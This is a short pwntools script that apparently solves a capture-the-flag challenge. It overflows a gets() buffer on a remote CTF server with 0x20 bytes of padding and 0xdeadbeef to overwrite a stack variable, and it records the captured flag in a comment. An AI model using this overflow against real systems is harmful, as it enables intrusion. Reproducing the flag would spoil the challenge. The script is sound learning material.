from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

# p = gdb.debug('./stacking', '''
#     b main
#     continue
# ''')

p = remote('recruit.osiris.bar', 21000)

p.recvuntil(b"gets is a super secure function! I'm sure it's totally safe...\n")
p.sendline(b"A"*0x20 + p64(0xdeadbeef))

p.interactive()

# flag{0verwr1ting_st4ck_v4riabl3z}
